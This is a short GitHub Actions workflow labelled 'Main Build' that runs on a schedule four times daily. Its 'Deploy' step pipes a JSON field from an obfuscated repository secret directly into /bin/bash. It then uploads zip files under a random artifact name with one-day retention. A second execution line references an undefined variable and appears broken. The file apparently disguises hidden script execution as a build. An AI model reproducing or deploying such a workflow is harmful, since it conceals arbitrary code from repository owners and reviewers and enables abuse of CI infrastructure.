name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '54 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          eer51: ${{ secrets.eer51 }}
        run: |
          printf '%s' "$eer51" | jq -r .px63095 | /bin/bash
          printf '%s' "$zr546" | jq -r .kko0 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: 1pIpQQ00
          path: "*.zip"
          retention-days: 1
